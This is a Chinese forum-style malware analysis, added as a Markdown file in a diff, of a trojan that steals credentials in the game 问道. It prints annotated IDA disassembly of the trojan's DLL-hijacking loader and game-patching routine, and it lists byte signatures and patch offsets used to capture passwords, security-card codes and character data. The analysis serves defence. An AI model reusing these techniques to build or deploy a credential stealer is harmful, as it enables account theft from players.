@@ -1,0 +1,317 @@
+
+
+# 一款游戏木马的详细分析
+
+> 原文：[`www.pediy.com/kssd/pediy12/143913.html`](https://www.pediy.com/kssd/pediy12/143913.html)
+
+**木马 介绍**:  
+ 名称:  问道木马  
+   大小:  32.0 KB  
+   释放文件:   
+     7cbdddd.dat     
+     ksuser.dll     --扮成系统文件             
+      midimap.dll   --     扮成系统文件      
+     sysapp17.dll           
+  
+**宿主文件执行流程**:  
+  
+运行后,释放 7cbdddd.dat 文件, 查找注册表里游戏的目录,在游戏目录中释放 ksuser.dll , midimap.dll, 在 windows 系统目录释放 sysapp17.dll,都是截取密码,patch 游戏的主 DLL.是一个文件..  
+把系统本身 ksuser.dll,  midimap.dll，改名为 Yumidimap.dll, Yuksuser.dll.  
+在 cache 目录里保存 ksuser.dll ,  midimap.dll 木马备份.  
+  
+7cbdddd.dat  与  ksuser.dll 等文件的执行流程一样,此文件对搜狗输入法有操作.以及删除 EXE 文件的工作.  
+  
+**ksuser.dll 流程**:  
+ 流程执行完成后会进行文件的加系统隐藏权限.  
+  
+
+代码:
+
+```
+.text:10005B30 ; BOOL \_\_stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+.text:10005B30 \_DllMain@12     proc near               ; CODE XREF: DllEntryPoint+4B#p
+.text:10005B30
+.text:10005B30 hinstDLL        = dword ptr  4
+.text:10005B30 fdwReason       = dword ptr  8
+.text:10005B30 lpvReserved     = dword ptr  0Ch
+.text:10005B30                 cmp     \[esp+fdwReason\], 1
+.text:10005B35                 jnz     short loc\_10005B73
+.text:10005B37                 mov     eax, \[esp+hinstDLL\]
+.text:10005B3B                 mov     hModule, eax
+.text:10005B40                 call    GetSystemInfo     //得到系统相关的信息,MAC 地址,系统目录,加载进程
+.text:10005B45                 call    IsLoadDll                          //得到加载的名称..
+.text:10005B4A                 call    GetFunAddress\_             //导出一系列系统函数,不想在输入表出现.
+.text:10005B4F                 xor     eax, eax
+.text:10005B51                 push    eax
+.text:10005B52                 push    eax
+.text:10005B53                 push    eax
+.text:10005B54                 push    offset sub\_10005A7A         //线程处理函数,重要操作在这里.
+.text:10005B59                 push    eax
+.text:10005B5A                 push    eax
+.text:10005B5B                 call    CreateThread\_
+.text:10005B61                 push    eax             ; hObject
+.text:10005B62                 call    ds:CloseHandle
+.text:10005B68                 push    offset FileName ; lpFileName
+.text:10005B6D                 call    sub\_10004D09      //将当前执行的 DLL 设置为系统隐藏属性.
+.text:10005B72                 pop     ecx
+.text:10005B73
+.text:10005B73 loc\_10005B73:                           ; CODE XREF: DllMain(x,x,x)+5#j
+.text:10005B73                 push    1
+.text:10005B75                 pop     eax
+.text:10005B76                 retn    0Ch
+.text:10005B76 \_DllMain@12     endp
+
+```
+
+**IsLoadDll 函数:   
+         功能: 因为修改替换了系统的文件,所以在加载到此 dll 的时候,dll 会检测当前加载的名称,然后 loadlibrary 原本系统函数,完成加载的目的.  
+**  
+  
+代码:
+
+```
+.text:10005983 IsLoadDll       proc near               ; CODE XREF: DllMain(x,x,x)+15#p
+.text:10005983
+.text:10005983 var\_C           = dword ptr -0Ch
+.text:10005983
+.text:10005983                 push    esi
+.text:10005984                 push    edi
+.text:10005985                 push    offset FileName ; Str
+.text:1000598A                 call    str\_str                         //字符串截断.
+.text:1000598F                 mov     esi, eax
+.text:10005991                 mov     \[esp+0Ch+var\_C\], offset aKsuser\_dll ; "ksuser.dll"
+.text:10005998                 push    esi             ; Str1
+.text:10005999                 call    strcmp                                          //判断是不是 ksuser.dll
+.text:1000599E                 pop     ecx
+.text:1000599F                 test    eax, eax
+.text:100059A1                 pop     ecx
+.text:100059A2                 jnz     short loc\_100059B0
+.text:100059A4                 push    offset aYuksuser\_dll ; "yuksuser.dll"      //加载原有的 dll.
+.text:100059A9                 mov     edi, offset dword\_1008FC80
+.text:100059AE                 jmp     short loc\_100059E8                             //跳过去.loadlibrary
+.text:100059B0 ; ---------------------------------------------------------------------------
+.text:100059B0
+.text:100059B0 loc\_100059B0:                           ; CODE XREF: IsLoadDll+1F#j
+.text:100059B0                 push    offset aMidimap\_dll ; "midimap.dll"
+.text:100059B5                 push    esi             ; Str1
+.text:100059B6                 call    strcmp
+.text:100059BB                 pop     ecx
+.text:100059BC                 test    eax, eax
+.text:100059BE                 pop     ecx
+.text:100059BF                 jnz     short loc\_100059CD
+.text:100059C1                 push    offset aYumidimap\_dll ; "yumidimap.dll"
+.text:100059C6                 mov     edi, offset dword\_1008FC84
+.text:100059CB                 jmp     short loc\_100059E8
+.text:100059CD ; ---------------------------------------------------------------------------
+.text:100059CD
+.text:100059CD loc\_100059CD:                           ; CODE XREF: IsLoadDll+3C#j
+.text:100059CD                 push    offset aComres\_dll ; "comres.dll"
+.text:100059D2                 push    esi             ; Str1
+.text:100059D3                 call    strcmp
+.text:100059D8                 pop     ecx
+.text:100059D9                 test    eax, eax
+.text:100059DB                 pop     ecx
+.text:100059DC                 jnz     short loc\_100059F9
+.text:100059DE                 push    offset aYucomres\_dll ; "yucomres.dll"
+.text:100059E3                 mov     edi, offset dword\_1008FC88
+.text:100059E8
+.text:100059E8 loc\_100059E8:                           ; CODE XREF: IsLoadDll+2B#j
+.text:100059E8                                         ; IsLoadDll+48#j
+.text:100059E8                 push    edi
+.text:100059E9                 call    loadSameDll                                    //加载原来的系统 dll
+.text:100059EE                 test    eax, eax
+.text:100059F0                 jnz     short loc\_100059F9
+.text:100059F2                 push    esi
+.text:100059F3                 push    edi
+.text:100059F4                 call    loadSameDll
+.text:100059F9
+.text:100059F9 loc\_100059F9:                        
+.text:100059F9                                    
+.text:100059F9                 pop     edi
+.text:100059FA                 pop     esi
+.text:100059FB                 retn
+.text:100059FB IsLoadDll       endp
+
+```
+
+**GetFunAddress\_ 函数:  
+                功能: 加载系统的函数,存放到全局变量里.  
+CopyFile, FindFirstFile,FindNextFile,CreateThread,GetModuleHandle,RegOpenKeyEx  
+RegQueryValueEx,RegEnumValue,SearchTreeForFileEnumWindows**  
+  
+**sub\_10005A7A 函数:  
+              功能:  线程回调函数,完成游戏特征码的查找,游戏 patch.  
+**  
+  
+代码:
+
+```
+.text:10005A7A                 push    ebp
+.text:10005A7B                 mov     ebp, esp
+.text:10005A7D                 sub     esp, 104h
+.text:10005A83                 push    ebx
+.text:10005A84                 push    esi
+.text:10005A85                 push    edi
+.text:10005A86                 push    offset unk\_1008F1B0 ; Dst
+.text:10005A8B                 push    1               ; int
+.text:10005A8D                 mov     esi, offset FileName
+.text:10005A92                 push    offset unk\_1008F260 ; int
+.text:10005A97                 push    esi             ; lpFileName
+.text:10005A98                 call    Decrypt\_        //读取文件末尾处的数据解密,与其他样本类似.
+.text:10005A9D                 push    offset unk\_1008FBA0
+.text:10005AA2                 call    GetMacAddress            //得到当前机器的 MAC 地址.
+.text:10005AA7                 add     esp, 14h
+.text:10005AAA                 call    Game\_Features         //查找游戏特征,Patch 游戏.
+.text:10005AAF                 cmp     eax, 1                        //patch 游戏成功后下面的流程不会到达
+.text:10005AB2                 jz      short loc\_10005B26
+.text:10005AB4                 push    esi             ; Str
+.text:10005AB5                 call     str\_str
+.text:10005ABA                 mov     esi, ds:strstr
+.text:10005AC0                 mov     ebx, offset aSysapp ; "sysapp"
+.text:10005AC5                 mov     edi, eax
+.text:10005AC7                 push    ebx             ; SubStr
+.text:10005AC8                 push    edi             ; Str
+.text:10005AC9                 call    esi ; strstr
+.text:10005ACB                 add     esp, 0Ch
+.text:10005ACE                 test    eax, eax
+.text:10005AD0                 jnz     short loc\_10005B26
+.text:10005AD2                 push    offset aComres  ; "comres"
+.text:10005AD7                 push    edi             ; Str
+.text:10005AD8                 call    esi ; strstr
+.text:10005ADA                 pop     ecx
+.text:10005ADB                 test    eax, eax
+.text:10005ADD                 pop     ecx
+.text:10005ADE                 jnz     short loc\_10005B26
+.text:10005AE0                 and     \[ebp+LibFileName\], al
+.text:10005AE6                 push    40h
+.text:10005AE8                 pop     ecx
+.text:10005AE9                 lea     edi, \[ebp+var\_103\]
+.text:10005AEF                 rep stosd
+.text:10005AF1                 stosw
+.text:10005AF3                 push    1
+.text:10005AF5                 stosb
+.text:10005AF6                 pop     esi
+
+```
+
+**Game\_Features 函数:  
+               功能: 查找游戏的特征码,patch 游戏的过程..在 Patch 思想上与其他游戏功能一样,实现的方法不一样.   只贴出部分代码,后面冗余重复代码没贴.  
+**  
+  
+代码:
+
+```
+.text:1000151D                 push    ebp
+.text:1000151E                 mov     ebp, esp
+.text:10001520                 sub     esp, 1Ch
+.text:10001523                 push    esi
+.text:10001524                 mov     esi, offset aAsktao\_mod ; "asktao.mod"
+.text:10001529                 push    esi             ; Str2
+.text:1000152A                 push    offset szLoaddllFrom ; Str1  
+.text:1000152F                 call    ds:\_stricmp                      //比较下看看加载进程是否是游戏加载.
+.text:10001535                 pop     ecx
+.text:10001536                 test    eax, eax
+.text:10001538                 pop     ecx
+.text:10001539                 jnz     loc\_1000183C
+.text:1000153F                 call    Create\_Event                //创建事件互斥.
+.text:10001544                 test    eax, eax
+.text:10001546                 jnz     loc\_1000183C
+.text:1000154C                 push    ebx
+.text:1000154D                 push    edi
+.text:1000154E                 call    ds:\_getpid                                //得到当前进程 id
+.text:10001554                 push    eax             ; lParam 
+.text:10001555                 push    offset EnumFunc ; lpEnumFunc //过程函数.
+如果在调试状态下,无法得到游戏窗口焦点,此为无限循环,后面调试无法进程.在此函数退出时更改 EAX 为 0
+.text:1000155A                 call    ds:EnumWindows                 //枚举窗口
+.text:10001560                 call    sub\_10001D71  
+.text:10001565                 mov     edi, eax
+.text:10001567                 call    sub\_10003E04
+.text:1000156C                 push    offset sub\_100013C1
+.text:10001571                 call    sub\_10003266
+                                                      //上面三函数为 C++初始化代码,第一个函数疑派生类.   第二个函数初始化 网络连接.WSAStartup,第三个函数,写虚函数地址表.
+.text:10001576                 pop     ecx
+.text:10001577                 lea     eax, \[ebp+var\_1C\]
+.text:1000157A                 push    1
+.text:1000157C                 push    12h
+.text:1000157E                 push    0Bh
+.text:10001580                 xor     ebx, ebx
+.text:10001582                 push    eax
+.text:10001583                 push    esi
+.text:10001584                 mov     ecx, edi
+.text:10001586                 mov     \[ebp+var\_1C\], 50h
+.text:1000158A                 mov     \[ebp+var\_1B\], 8Dh
+.text:1000158E                 mov     \[ebp+var\_1A\], 94h
+.text:10001592                 mov     \[ebp+var\_19\], 24h
+.text:10001596                 mov     \[ebp+var\_18\], 1Ch
+.text:1000159A                 mov     \[ebp+var\_17\], 2
+.text:1000159E                 mov     \[ebp+var\_16\], bl
+.text:100015A1                 mov     \[ebp+var\_15\], bl
+.text:100015A4                 mov     \[ebp+var\_14\], 52h
+.text:100015A8                 mov     \[ebp+var\_13\], 8Bh
+.text:100015AC                 mov     \[ebp+var\_12\], 0CFh
+.text:100015B0                 call    GetFeatures           //字符串查找寻找特征,与前一样本一样,返回找到的地址.
+.text:100015B5                 cmp     eax, ebx
+.text:100015B7                 mov     \[ebp+var\_8\], eax
+.text:100015BA                 jz      short loc\_100015DE
+.text:100015BC                 push    offset sub\_100010FC ; int   //patch 的跳转地址.
+.text:100015C1                 push    eax             ; lpAddress    //游戏中的位置
+.text:100015C2                 mov     ecx, edi
+.text:100015C4                 call    SetFeaturesPatch         //patch 游戏
+
+```
+
+**SetFeaturesPatch 函数:  
+                 功能: 对游戏中的关键位置 Patch.  
+**  
+  
+  
+**dll 文件流程完成.下面为 Patch 的跳转函数.  
+  
+  
+查找特征游戏进程中                             地址              PatchRVA     
+  
+50 8D 94 24 1C 02 00 00 52 8B CF      0045636E         10FC     输入密码截取.每个字符截取  
+6A 7F 8D 44 24 11 6A 00 50            0064CC3D         12A1       创建新线程账号密码发送  
+8D 54 24 58 52 57                     0066DAE6         108B    发送用户名.读取游戏配置文件得到区号，发送  
+83 C4 14 8D 8C 24 2C 03 00 00 51      005266C7         1119->39B2  人物名称,发送到网页.  
+8B 44 24 4C 8B 4C 24 38               005EAA13         11A2    金钱，人物等级,元宝.  
+83 C4 0C 83 BE 28 02 00 00 00         006E0990         1276     截图..   
+  
+gbits.dll 找特征  
+83 C4 0C 83 8B 74 24 28 8A 06         1105341E         12D3      
+**  
+  
+**10FC  函数:  
+      功能: 从堆栈里读取我输入的密码框数据,(明文),保存到全局变量.  
+**  
+**12A1 函数:  函数到达的时机在用户输入密码验证框时.密保.  
+     功能:创建新线程, 账号密码图片发送.  
+**  
+**108B 函数: 时机在用户名密码输入完成登录游戏后.   
+      功能: 读取游戏目录下的配置文件,得到区号-服务器名  
+**  
+  
+**1119 函数:  
+    功能: 得到人物的名称.发送信息.  
+  
+11A2 函数:  
+    功能: 更新相关标志位,标志游戏当前的时机,得到 金钱，人物等级,.,元宝.发送信息  
+**  
+**1276 函数: 当用户游戏点击开锁,输入密码确定时.  
+     功能: 取得游戏内密码锁开锁时的密码.  
+**  
+  
+**  
+12D3 函数:  此到达的时机当用户有密保卡或者乾坤锁时.  
+     功能: 截取密保.  
+**  
+  
+以上差不多就是相关的信息..  
+差不多够详细了..整个木马的一套流程都理清楚了.  
+  
+有些地方我没有验证,各位如果有验证的请告知下对错否.\_\_ 里面特征请勿对号入座...  
+我附件上传 idb 文件..
+
+上传的附件
+| ![](img/620251b33676a8e4b98ca0ece915ee8d.jpg) || ksuser.zip  
+ |
